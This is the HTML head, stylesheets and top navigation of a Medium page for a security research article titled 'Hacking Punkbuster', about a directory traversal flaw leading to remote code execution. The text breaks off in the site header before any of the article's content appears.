<!doctype html><html lang="en"><head><title data-rh="true">Hacking Punkbuster. A Directory Traversal Attack on… | by Daniel Prizmant | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2024-07-20T04:35:39.752Z"/><meta data-rh="true" name="title" content="Hacking Punkbuster. A Directory Traversal Attack on… | by Daniel Prizmant | Medium"/><meta data-rh="true" property="og:title" content="Hacking Punkbuster"/><meta data-rh="true" property="al:android:url" content="medium://p/e22e6cf2f36e"/><meta data-rh="true" property="al:ios:url" content="medium://p/e22e6cf2f36e"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="We are two gamers that love the Battlefield series and also happened to like reverse engineering projects. Daniel Prizmant — A senior security researcher at Palo Alto Networks who loves video games…"/><meta data-rh="true" property="og:description" content="A Directory Traversal Attack on Punkbuster Server can be Leveraged to Gain Remote Code Execution"/><meta data-rh="true" property="og:url" content="https://medium.com/@prizmant/hacking-punkbuster-e22e6cf2f36e"/><meta data-rh="true" property="al:web:url" content="https://medium.com/@prizmant/hacking-punkbuster-e22e6cf2f36e"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1120/1*9CiLrQCxtufYQW0TU8O4aA.png"/><meta data-rh="true" property="article:author" content="https://medium.com/@prizmant"/><meta data-rh="true" name="author" content="Daniel Prizmant"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="Hacking Punkbuster"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/e22e6cf2f36e"/><meta data-rh="true" property="twitter:description" content="A Directory Traversal Attack on Punkbuster Server can be Leveraged to Gain Remote Code Execution"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1120/1*9CiLrQCxtufYQW0TU8O4aA.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="10 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@prizmant"/><link data-rh="true" rel="canonical" href="https://medium.com/@prizmant/hacking-punkbuster-e22e6cf2f36e"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/e22e6cf2f36e"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*9CiLrQCxtufYQW0TU8O4aA.png"],"url":"https:\u002F\u002Fmedium.com\u002F@prizmant\u002Fhacking-punkbuster-e22e6cf2f36e","dateCreated":"2020-09-25T11:19:20.715Z","datePublished":"2020-09-25T11:19:20.715Z","dateModified":"2024-07-20T04:35:40.390Z","headline":"Hacking Punkbuster - Daniel Prizmant - Medium","name":"Hacking Punkbuster - Daniel Prizmant - Medium","description":"We are two gamers that love the Battlefield series and also happened to like reverse engineering projects. Daniel Prizmant — A senior security researcher at Palo Alto Networks who loves video games…","identifier":"e22e6cf2f36e","author":{"@type":"Person","name":"Daniel Prizmant","url":"https:\u002F\u002Fmedium.com\u002F@prizmant"},"creator":["Daniel Prizmant"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fmedium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fmedium.com\u002F@prizmant\u002Fhacking-punkbuster-e22e6cf2f36e"}</script><style type="text/css" data-fela-rehydration="525" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="525" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-bottom:2px}.ii{flex-wrap:nowrap}.ij{font-size:16px}.ik{line-height:24px}.im{margin:0 8px}.in{display:inline}.io{color:#1A8917}.ip{fill:#1A8917}.is{flex:0 0 auto}.iv{flex-wrap:wrap}.iw{padding-left:8px}.ix{padding-right:8px}.jy> *{flex-shrink:0}.jz{overflow-x:scroll}.ka::-webkit-scrollbar{display:none}.kb{scrollbar-width:none}.kc{-ms-overflow-style:none}.kd{width:74px}.ke{flex-direction:row}.kf{z-index:2}.kg{margin-right:4px}.kj{-webkit-user-select:none}.kk{border:0}.kl{fill:rgba(117, 117, 117, 1)}.ko{outline:0}.kp{user-select:none}.kq> svg{pointer-events:none}.kz{cursor:progress}.la{opacity:1}.lb{padding:4px 0}.le{margin-top:0px}.lf{width:16px}.lh{display:inline-flex}.ln{max-width:100%}.lo{padding:8px 2px}.lp svg{color:#6B6B6B}.mg{line-height:1.12}.mh{letter-spacing:-0.022em}.mi{font-weight:600}.nd{margin-bottom:-0.28em}.ne{margin-left:auto}.nf{margin-right:auto}.ng{max-width:1120px}.nm{clear:both}.no{cursor:zoom-in}.np{z-index:auto}.nr{height:auto}.ns{line-height:1.58}.nt{letter-spacing:-0.004em}.nu{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.op{margin-bottom:-0.46em}.oq{font-style:italic}.ow{text-decoration:underline}.ox{list-style-type:disc}.oy{margin-left:30px}.oz{padding-left:0px}.pa{padding:2px 4px}.pb{font-size:75%}.pc> strong{font-family:inherit}.pd{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.pj{max-width:1014px}.pk{overflow-x:auto}.pl{padding:20px}.pm{border-radius:0}.pn{background:#F2F2F2}.po{line-height:1.18}.pp{margin-top:-0.09em}.pq{margin-bottom:-0.09em}.pr{white-space:pre-wrap}.ps{min-width:fit-content}.pt{margin-top:0.91em}.pu{max-width:1038px}.pv{margin-top:10px}.pw{max-width:728px}.pz{border-top:none}.qa{margin-bottom:50px}.qb{height:52px}.qc{max-height:52px}.qd{box-sizing:content-box}.qe{position:static}.qf{z-index:1}.qh{max-width:155px}.qn{margin-right:20px}.qo{margin-bottom:64px}.rd{height:64px}.re{width:64px}.rf{align-self:flex-end}.rg{color:rgba(255, 255, 255, 1)}.rh{padding:8px 16px}.ri{fill:rgba(255, 255, 255, 1)}.rj{background:rgba(25, 25, 25, 1)}.rk{border-color:rgba(25, 25, 25, 1)}.rn:disabled{opacity:0.1}.ro:disabled:hover{background:rgba(25, 25, 25, 1)}.rp:disabled:hover{border-color:rgba(25, 25, 25, 1)}.rq{flex:1 1 auto}.rw{padding-right:4px}.rx{font-weight:500}.sk{margin-top:8px}.sl{margin-top:16px}.sm{margin-bottom:54px}.sn{height:0px}.so{gap:18px}.sp{fill:rgba(61, 61, 61, 1)}.tb{border-bottom:solid 1px #E5E5E5}.tc{margin-top:72px}.td{padding:24px 0}.te{margin-bottom:0px}.tf{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.il:hover{text-decoration:underline}.iq:hover:not(:disabled){color:#156D12}.ir:hover:not(:disabled){fill:#156D12}.kn:hover{fill:rgba(8, 8, 8, 1)}.lc:hover{fill:#000000}.ld:hover p{color:#000000}.lg:hover{color:#000000}.lq:hover svg{color:#000000}.rc:hover{background-color:none}.rl:hover{background:#000000}.rm:hover{border-color:#242424}.sq:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.km:focus{fill:rgba(8, 8, 8, 1)}.lr:focus svg{color:#000000}.nq:focus{transform:scale(1.01)}.kr:active{border-style:none}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:50px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jk{border-top:solid 1px #F2F2F2}.jl{border-bottom:solid 1px #F2F2F2}.jm{margin:32px 0 0}.jn{padding:3px 8px}.jw> *{margin-right:24px}.jx> :last-child{margin-right:0}.ky{margin-top:0px}.lm{margin:0}.mz{font-size:24px}.na{margin-top:1.95em}.nb{line-height:30px}.nc{letter-spacing:-0.016em}.nl{margin-top:56px}.ol{font-size:20px}.om{margin-top:0.94em}.on{line-height:32px}.oo{letter-spacing:-0.003em}.ov{margin-top:2.14em}.pi{margin-top:1.14em}.qm{display:inline-block}.qp{flex-direction:row}.qs{margin-bottom:0}.qt{margin-right:20px}.rr{max-width:500px}.si{line-height:24px}.sj{letter-spacing:0}.sv{margin:40px 0 0}.ta{padding-top:72px}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.kx{margin-top:0px}.px{margin-left:auto}.py{text-align:center}.ql{display:inline-block}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.kw{margin-top:0px}.qk{display:inline-block}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.ku{margin-top:0px}.kv{margin-right:0px}.qj{display:inline-block}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:2px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.it{flex-direction:column}.iy{margin:24px -24px 0}.iz{padding:0}.jo> *{margin-right:8px}.jp> :last-child{margin-right:24px}.kh{margin-left:0px}.ks{margin-top:0px}.kt{margin-right:0px}.li{margin:0}.ls{border:1px solid #F2F2F2}.lt{border-radius:99em}.lu{padding:0px 16px 0px 12px}.lv{height:38px}.lw{align-items:center}.ly svg{margin-right:8px}.mj{font-size:20px}.mk{margin-top:1.2em}.ml{line-height:24px}.mm{letter-spacing:0}.nh{margin-top:40px}.nv{font-size:18px}.nw{margin-top:0.67em}.nx{line-height:28px}.ny{letter-spacing:-0.003em}.or{margin-top:1.56em}.pe{margin-top:1.34em}.qi{display:inline-block}.ra{margin-bottom:20px}.rb{margin-right:0}.rv{max-width:100%}.ry{font-size:24px}.rz{line-height:30px}.sa{letter-spacing:-0.016em}.sr{margin:32px 0 0}.sw{padding-top:48px}.lx:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:50px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jg{border-top:solid 1px #F2F2F2}.jh{border-bottom:solid 1px #F2F2F2}.ji{margin:32px 0 0}.jj{padding:3px 8px}.ju> *{margin-right:24px}.jv> :last-child{margin-right:0}.ll{margin:0}.mv{font-size:24px}.mw{margin-top:1.95em}.mx{line-height:30px}.my{letter-spacing:-0.016em}.nk{margin-top:56px}.oh{font-size:20px}.oi{margin-top:0.94em}.oj{line-height:32px}.ok{letter-spacing:-0.003em}.ou{margin-top:2.14em}.ph{margin-top:1.14em}.qq{flex-direction:row}.qu{margin-bottom:0}.qv{margin-right:20px}.rs{max-width:500px}.sg{line-height:24px}.sh{letter-spacing:0}.su{margin:40px 0 0}.sz{padding-top:72px}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:50px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jc{border-top:solid 1px #F2F2F2}.jd{border-bottom:solid 1px #F2F2F2}.je{margin:32px 0 0}.jf{padding:3px 8px}.js> *{margin-right:24px}.jt> :last-child{margin-right:0}.lk{margin:0}.mr{font-size:24px}.ms{margin-top:1.95em}.mt{line-height:30px}.mu{letter-spacing:-0.016em}.nj{margin-top:56px}.od{font-size:20px}.oe{margin-top:0.94em}.of{line-height:32px}.og{letter-spacing:-0.003em}.ot{margin-top:2.14em}.pg{margin-top:1.14em}.qr{flex-direction:row}.qw{margin-bottom:0}.qx{margin-right:20px}.rt{max-width:500px}.se{line-height:24px}.sf{letter-spacing:0}.st{margin:40px 0 0}.sy{padding-top:72px}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:2px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iu{flex-direction:column}.ja{margin:24px 0 0}.jb{padding:0}.jq> *{margin-right:8px}.jr> :last-child{margin-right:8px}.ki{margin-left:0px}.lj{margin:0}.lz{border:1px solid #F2F2F2}.ma{border-radius:99em}.mb{padding:0px 16px 0px 12px}.mc{height:38px}.md{align-items:center}.mf svg{margin-right:8px}.mn{font-size:20px}.mo{margin-top:1.2em}.mp{line-height:24px}.mq{letter-spacing:0}.ni{margin-top:40px}.nz{font-size:18px}.oa{margin-top:0.67em}.ob{line-height:28px}.oc{letter-spacing:-0.003em}.os{margin-top:1.56em}.pf{margin-top:1.34em}.qy{margin-bottom:20px}.qz{margin-right:0}.ru{max-width:100%}.sb{font-size:24px}.sc{line-height:30px}.sd{letter-spacing:-0.016em}.ss{margin:32px 0 0}.sx{padding-top:48px}.me:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="print">.qg{display:none}</style><style type="text/css" data-fela-rehydration="525" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.nn{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fe22e6cf2f36e&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="/?source=---top_nav_layout_nav----------------------------------"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" rel="noopener follow" 